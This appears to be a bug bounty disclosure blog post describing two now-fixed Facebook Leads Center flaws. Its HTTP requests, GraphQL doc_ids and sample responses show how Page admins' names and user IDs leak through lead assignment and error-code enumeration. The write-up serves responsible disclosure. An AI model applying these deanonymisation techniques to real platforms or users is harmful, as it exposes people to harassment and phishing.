---
title: "Leads Center Enables Page Admin Deanonymization via Assignment and Error Handling"
description: "Two Leads Center issues enable Page Admin identification through lead assignment disclosure and error‑based role inference."
date: 2025-09-16
categories: [Meta bug bounty]
tags: [Meta]
pin: false
math: true
mermaid: true
---

### 🧾 Description
Two independent vulnerabilities exist in Facebook Pages Leads Center, both resulting in Page Admin identity disclosure.
The vulnerabilities differ in exploitation conditions:
- The first vulnerability requires the attacker to already exist as a lead. This can happen naturally when a Page admin adds the attacker as a lead via Messenger, Instant Forms, or any other lead source. Once the lead exists, Page admins commonly use the built‑in feature to assign the lead to themselves in order to manage it. At that moment, the attacker can identify which Page admin is responsible for the lead.
- The second vulnerability does not require any interaction from Page admins. The attacker can directly infer whether an arbitrary user ID belongs to a Page admin by abusing inconsistent error responses returned by a GraphQL mutation. This method relies purely on ID guessing and error analysis.
When combined, these issues allow full Page Admin deanonymization.

---

## ⚙️ Method 1: Direct Information Disclosure via Lead Assignment

When a Page admin assigns an existing lead to themselves in Leads Center, the response reveals the admin’s personal identity, allowing the lead owner to identify the responsible Page admin.

### Reproduction Steps:
1. Attacker becomes a lead for the target Page.
2. Admin (Victim) assigns this lead to themselves in the Meta Business Suite/Leads Center.
3. Attacker captures the following GraphQL request to check their lead status:

**Request**
```http
POST /api/graphql/ HTTP/1.1
Host: www.facebook.com
Content-Type: application/x-www-form-urlencoded

&variables={"pageID":"<TARGET_PAGE_ID>"}&doc_id=10086508691459742
```

**Response (PII Disclosure)**
```json
    {
      "data": {
        "page": {
          "lead_owner": {
            "id": "1000XXXXXXXXX", 
            "name": "Admin Real Name"
          }
        }
      }
    }
```

---

## ⚙️ Method 2: Page Admin Enumeration via GraphQL Error Responses

This side-channel issue allows an attacker to verify whether an arbitrary Facebook user ID has admin privileges on a Page by analyzing differential error responses during lead assignment.

### Reproduction Steps:
1. A lead already exists in the Page’s Leads Center.
2. Query the Page’s lead opportunities and record the `lead_opportunity_id`.
3. Issue the `lead_opportunity_assign_admin` mutation with a test `owner` value.
4. Observe the returned error response.

----

### A. Fetch Lead Opportunities

**Request**
```http
POST /api/graphql/ HTTP/1.1
Host: www.facebook.com
Content-Type: application/x-www-form-urlencoded

&variables={"page_id":"ID-VICTIM-PAGE"}&doc_id=31412909588299795
```
**Response**
```json
{
  "data": {
    "page": {
      "lead_opportunities": {
        "edges": [
          {
            "node": {
              "id": "ID-LEAD",
              "name": "Attacker Name"
            }
          }
        ]
      }
    }
  }
}
```
###  B. Attempt to Assign Lead Owner

```http
POST /api/graphql/ HTTP/1.1
Host: www.facebook.com
Content-Type: application/x-www-form-urlencoded

&variables={
"input":{
"client_mutation_id":"6",
"actor_id":"0",
"lead_opportunity_id":"ID-LEAD",
"page_id":"ID-VICTIM-PAGE",
"owner":"<CANDIDATE_USER_ID>",
"leads_center_view_type":"pipeline"
}
}&doc_id=9937695516291061
```
**Response** 

#### Owner is not a Page admin
```json
{
  "data": { "lead_opportunity_assign_admin": null },
  "errors": [
    {
      "code": 2781001,
      "description": "Assign to an illegal Lead Owner!",
      "path": ["lead_opportunity_assign_admin"]
    }
  ]
}
```

#### Owner is a Page admin
```json
{
  "data": { "lead_opportunity_assign_admin": null },
  "errors": [
    {
      "code": 1675030,
      "description": "Error performing query.",
      "path": ["lead_opportunity_assign_admin"]
    }
  ]
}
```

### 🧱 Impact
Combining both methods allows an attacker to retrieve real names and user IDs of Page administrators, enabling targeted harassment, phishing, or further social engineering attacks.

---

## 📅 Timeline
- Reported: September 16, 2025
- Triaged: September 30, 2025
- Fixed: October 5, 2025
- Reward: October 10, 2025
